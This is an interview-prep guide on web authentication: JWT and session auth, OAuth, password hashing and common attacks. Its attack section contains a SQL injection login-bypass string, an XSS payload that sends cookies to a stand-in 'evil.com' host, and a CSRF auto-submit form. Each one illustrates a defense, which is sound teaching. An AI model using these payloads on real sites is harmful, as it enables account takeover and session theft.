# Security & Auth Basics — Interview Prep Guide

## Why this matters
Almost every backend interview asks: "How did you handle authentication in your project?" If you used JWT in paisapulse/SAKSHAM, you must explain the full flow and tradeoffs. This doc covers everything asked at fresher level.

---

## Part 1: Authentication vs Authorization

**Authentication (AuthN)** = WHO are you? (verify identity)
**Authorization (AuthZ)** = WHAT can you do? (verify permissions)

**Example from your projects:**
- Login with email+password -> Authentication
- Only an admin can delete users / only the owner can edit their transaction -> Authorization

**Interview Q: "Where does authorization live in code?"**
Middleware/guards (e.g. `Depends(get_current_user)` in FastAPI, `protect` middleware in Express) that checks the token, then role checks before the handler runs.

---

In authentication (auth), the core difference between encoding and encryption is their fundamental purpose: encoding is for data compatibility, while encryption is for data confidentiality."Encryption is a technique used for protecting the confidentiality of the data. Encoding is used for preserving the usability of the data." — [GeeksforGeeks]Confusing the two in an identity system creates critical security vulnerabilities, as encoding provides absolutely zero protection against unauthorized access. [1] 

Direct ComparisonFeatureEncodingEncryptionPrimary GoalData Usability & InteroperabilityData Confidentiality & PrivacyRequires a Key?

❌ No (Uses a public, standard algorithm)Yes (Requires a secret key to reverse)Security LevelNone. Anyone can reverse it instantly.High. Unreadable without the proper key.

Auth Analogy Translating text into Morse code.Locking a document inside a heavy safe.How They Apply to Auth Systems1. Encoding in AuthEncoding changes data from one format to another so that different systems (like web browsers, APIs, and databases) can safely transmit it without character corruption. [1] 


The Auth Trap: A common beginner mistake is assuming an encoded string is secure because it looks like gibberish. For example, HTTP Basic Authentication bundles your username:password and encodes it into Base64. "It's important to know that Basic authentication is not secure! ... All the hacker needs to do is go to a site like this and decode my username and password." — [Thinking Tester] JSON Web Tokens (JWTs): By default, standard JWTs (used in modern OAuth2/OIDC flows) are only encoded using Base64URL. The frontend and backend can easily read the user's ID or roles out of the payload without a cryptographic key. It is signed to prevent tampering, but the information inside is visible to anyone who intercepts it. [1] 

2. Encryption in AuthEncryption scrambles data into ciphertext using a complex mathematical algorithm and a secret key. If an unauthorized party intercepts encrypted auth data, they cannot read it without possessing the matching decryption key. [1] HTTPS/TLS: When you submit a password on a login screen, the entire request is encrypted via TLS/SSL before it leaves your computer. This ensures that even though your password might be Base64 encoded inside the request, network snoopers only see encrypted "garbage" data. 

[1] Encrypted Tokens (JWE): If an authentication token contains sensitive user information (like a physical address or medical ID), systems will use JSON Web Encryption (JWE) to completely hide the contents from the client's view.Summary Checklist for Auth ArchitectureUse Encoding (like Base64 or URL encoding) when you need to safely pass data through URLs, HTTP headers, or HTML forms.Use Encryption (like AES or RSA) when you need to pass private data over a network or store highly sensitive tokens.(Bonus) Never encrypt or encode passwords in a database—always hash them using strong, one-way algorithms like bcrypt or Argon2 to ensure they can never be reversed if stolen.

---

## Part 2: Session-based vs Token-based (JWT) auth

### 2.1 Session-based (classic)
1. User logs in with credentials
2. Server creates a session object in memory/Redis: `sessionId -> userId`
3. Server sends `Set-Cookie: sessionId=abc123; HttpOnly; Secure`
4. Browser auto-sends cookie on every request
5. Server looks up sessionId in store to know who it is

### 2.2 Token-based / JWT (stateless)
1. User logs in with credentials
2. Server creates a JWT: header.payload.signature, **signed** with a secret key
3. Sends token to client; client stores it (memory / localStorage / cookie)
4. Client sends it as `Authorization: Bearer <token>` header
5. Server only **verifies the signature** - no DB/Redis lookup needed (stateless)

### 2.3 Anatomy of a JWT
```
eyJhbGciOiJIUzI1NiJ9 . eyJ1c2VyX2lkIjoxN30 . SflKxwRJSMeK...
      HEADER                 PAYLOAD               SIGNATURE
```
- **Header**: `{"alg": "HS256", "typ": "JWT"}` (base64url encoded)
- **Payload (claims)**: `{"sub": "user123", "role": "admin", "exp": 1735689600, "iat": 1735603200}`
- **Signature**: `HMAC_SHA256(base64(header) + "." + base64(payload), secret)`
- Header and payload are only **encoded, NOT encrypted** - anyone can decode them. NEVER put passwords/PII in the payload.

### 2.4 The comparison table interviewers want

| Aspect | Sessions | JWT |
|---|---|---|
| State | Server stores state (Redis/DB) | Stateless - token carries identity |
| Scaling | Need shared session store | Any server can verify (just the secret) |
| Logout/revoke | Delete server session = instant | Hard - valid until expiry (need blacklist) |
| Size | Tiny cookie | Larger; travels on every request |
| Best for | Traditional web apps, easy revoke | APIs, mobile apps, microservices |

### 2.5 JWT logout problem (asked constantly)

**Interview Q: "Why is JWT logout hard? How do you solve it?"**
JWT has no server state, so you can't "delete" it. Solutions:
1. **Short expiry (15 min) + refresh token** - a stolen access token dies quickly
2. **Blacklist in Redis** - check token's `jti` on each request (adds back some state)
3. **Token versioning** - store `tokenVersion` per user in DB; bump it on logout/password change

### 2.6 Refresh tokens
- **Access token**: short-lived (5-15 min), sent with every API call
- **Refresh token**: long-lived (days/weeks), stored securely, ONLY used to get new access tokens
- Flow: access expires -> client calls `/auth/refresh` with refresh token -> server validates & issues new access token
- Why: limits damage of a leaked access token, lets you revoke refresh tokens server-side
- Best practice: **refresh token rotation** - each use issues a NEW refresh token and invalidates the old one

**Interview Q: "Where do you store JWT on the frontend?"**
- `localStorage`: easy, but vulnerable to XSS (any injected script can read it)
- `HttpOnly, Secure, SameSite` cookies: JS can't read them -> immune to XSS token theft, but need CSRF protection
- Memory + silent refresh: safest for SPAs, slightly more code
- Good answer: "HttpOnly cookies for a web app; localStorage only if third parties consume the API, with short-lived tokens."

---

## Part 3: OAuth 2.0 (Login with Google/GitHub)

**The problem it solves:** let users log in WITHOUT giving you their password.

**4 roles:**
- **Resource Owner** = the user
- **Client** = your app
- **Authorization Server** = Google's login server (issues tokens)
- **Resource Server** = Google's API (accepts tokens)

**Authorization Code flow (the one to know) - "Sign in with Google":**
1. User clicks "Continue with Google" -> browser goes to Google's authorize URL with your `client_id`, `redirect_uri`, `scope`, and a random `state` string
2. User logs in on Google and consents
3. Google redirects back to `redirect_uri?code=AUTH_CODE&state=...`
4. Your backend exchanges code + `client_secret` for tokens (server-to-server)
5. You get an `access_token`, call Google's API to fetch profile/email
6. Your app creates/links its own user record and issues ITS OWN session/JWT

**Key terms:**
- `client_id` / `client_secret`: your app's public ID / private key
- `scope`: what data you request (email, profile)
- `state`: random value to prevent CSRF (verify it matches on callback)
- `redirect_uri`: must be whitelisted exactly

**Interview Q: "OAuth vs OIDC?"**
OAuth 2.0 = authorization (delegated access). **OpenID Connect (OIDC)** = identity layer on top of OAuth that adds an `id_token` (a JWT) telling you WHO the user is. "Login with Google" = OIDC.

**Interview Q: "Why is the code exchange done on the backend?"**
The `client_secret` must never be exposed in the browser; the code alone is useless without it. (Public/mobile clients use PKCE instead of a secret.)

---

## Part 4: Password storage - hashing vs encryption

**NEVER store passwords. Not even encrypted. Hash them.**

| | Hashing | Encryption |
|---|---|---|
| Reversible? | No (one-way) | Yes (with key) |
| Purpose | Verify passwords | Protect data you must read back (card numbers, tokens) |
| Algorithms | bcrypt, scrypt, Argon2 | AES-256 |

**Why bcrypt/Argon2 and NOT SHA-256 for passwords?**
1. **Salted**: bcrypt auto-generates a random salt per password -> identical passwords produce different hashes -> rainbow tables useless
2. **Slow by design**: configurable cost factor (e.g. 12 rounds ~ 250ms) -> brute force is expensive. SHA-256 is too fast - attackers try billions/sec
3. Salt is stored INSIDE the bcrypt hash string: `$2b$12$<salt><hash>`

```python
# Python
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
bcrypt.checkpw(password.encode(), hashed)   # True/False
```

```javascript
// Node
const bcrypt = require("bcrypt");
const hash = await bcrypt.hash(password, 12);
const ok = await bcrypt.compare(password, hash);
```

**Interview Q: "What's a rainbow table?"**
Precomputed table of password->hash for common passwords. Defeated by salting: attacker would need one table per salt.

**Interview Q: "HTTPS vs hashing - how do they relate?"**
HTTPS protects the password IN TRANSIT; hashing protects it AT REST in your DB. You need both.


---

## Part 5: Web attacks & defenses (the 5 every interviewer knows)

### 5.1 SQL Injection
**Attack:** user input becomes part of SQL.
```
input username: ' OR 1=1 --
query becomes: SELECT * FROM users WHERE name='' OR 1=1 --'
=> logs in as first user / dumps the table
```
**Defense: parameterized queries / ORM** - never string-concatenate SQL.
```python
# BAD
db.execute(f"SELECT * FROM users WHERE name='{name}'")
# GOOD (parameterized)
db.execute("SELECT * FROM users WHERE name=%s", (name,))
# SQLAlchemy / Prisma / Mongoose do this by default
```

### 5.2 XSS (Cross-Site Scripting)
**Attack:** attacker injects JS into a page other users view (e.g. a comment containing
`<script>fetch('evil.com?c='+document.cookie)</script>`).
It runs in every victim's browser and can steal tokens/cookies.
**Defense:**
- Escape by default (React escapes JSX - NEVER use `dangerouslySetInnerHTML` on user input)
- Sanitize HTML with DOMPurify if you must render rich text
- Content-Security-Policy header limits what scripts can load
- HttpOnly cookies so JS can't read them even if XSS happens

### 5.3 CSRF (Cross-Site Request Forgery)
**Attack:** you're logged into yourbank.com (cookie auto-sent by browser). You visit evil.com which auto-submits `<form action="https://yourbank.com/transfer" method="POST">`. The browser attaches your bank cookie -> transfer happens without your consent.
**Defense:**
- `SameSite=Lax/Strict` cookies (modern default, blocks most CSRF)
- CSRF token: server issues a random token the legit form must echo back; evil.com can't read it (same-origin policy)
- JWT-in-header APIs largely sidestep CSRF (browsers don't auto-attach Authorization headers) - one argument FOR header tokens

### 5.4 CORS (not an attack - a browser security mechanism)
- Browser blocks JS on origin A from reading responses from origin B unless B explicitly allows it
- Server responds with `Access-Control-Allow-Origin: https://yourapp.com`
- **Preflight**: for "non-simple" requests (Authorization/custom headers, PUT/DELETE), the browser sends an OPTIONS request first; server must reply with allowed origin/methods/headers
- Interview nuance: "CORS is enforced by the BROWSER, not the server - curl/Postman ignore it. It protects users, not APIs."

```javascript
// Express
const cors = require("cors");
app.use(cors({ origin: "https://yourapp.com", credentials: true }));
```

### 5.5 Rate limiting & brute-force defense
- Rate limit login/OTP/API endpoints (e.g. 5 attempts/min per IP) - Redis counters, `express-rate-limit`, `slowapi` for FastAPI
- Generic error: "Invalid email or password" (don't reveal which part was wrong)
- Account lockout / increasing delay after N failures
- Project example: "I rate-limited the OTP endpoint so it couldn't be spammed."

---

## Part 6: HTTPS / TLS (2-minute version)

1. Client connects to server on port 443
2. **TLS handshake**: server presents its CERTIFICATE (signed by a trusted CA - proves "I really am bank.com")
3. Client verifies the cert chain, then both derive a shared **symmetric session key**
4. All further traffic is encrypted + tamper-proof

**Why asymmetric AND symmetric?** Asymmetric (RSA/ECDHE) safely solves key exchange but is slow; symmetric (AES) is fast for bulk data.

**Interview Q: "What does a certificate prove?"**
That the public key in it belongs to that domain, vouched for by a Certificate Authority your browser already trusts.

---

## Part 7: Terms dropped in interviews (one-liners)

- **Hashing vs encoding vs encryption**: encoding (base64) = transport, zero security; hashing = verify/integrity; encryption = confidentiality
- **Principle of least privilege**: users/services get only the permissions they need (IAM policies, scoped DB users)
- **Input validation**: validate on the SERVER too (client-side is UX, not security); use schemas - Pydantic (FastAPI), Zod (TS)
- **Security headers**: `Content-Security-Policy`, `Strict-Transport-Security` (force HTTPS), `X-Content-Type-Options: nosniff`, `X-Frame-Options` (anti-clickjacking)
- **Webhook signatures**: verify the `X-Signature` header = HMAC(payload, shared secret) - Stripe/Twilio do this; otherwise anyone can POST fake events to your webhook
- **Dependency security**: `npm audit` / `pip-audit`; most real breaches come through vulnerable dependencies
- **Secret rotation**: change keys without downtime - version your secrets/tokens

---

## Part 8: Your project answer template (rehearse this out loud)

"When a user logs in, we verify the bcrypt hash, then issue a short-lived JWT access token carrying their user id and role, plus a refresh token. The access token goes in the Authorization header; the refresh token is an HttpOnly cookie. FastAPI middleware validates the token signature and expiry on protected routes, and role-based checks handle authorization. For third-party login we'd use the OAuth2 authorization-code flow. Secrets live in env vars, endpoints are rate-limited, and all DB access goes through the ORM so queries are parameterized."

**Expect these follow-ups:**
1. How does logout work with JWT? (short expiry + refresh/blacklist)
2. Where do you store tokens on the client? (HttpOnly cookie vs localStorage tradeoffs)
3. What's inside your JWT payload? (sub/role/iat/exp - nothing sensitive)
4. How is CORS configured in your app? (specific origin, credentials, preflight)
5. How would you store card numbers? (you wouldn't - payment gateway tokenization)

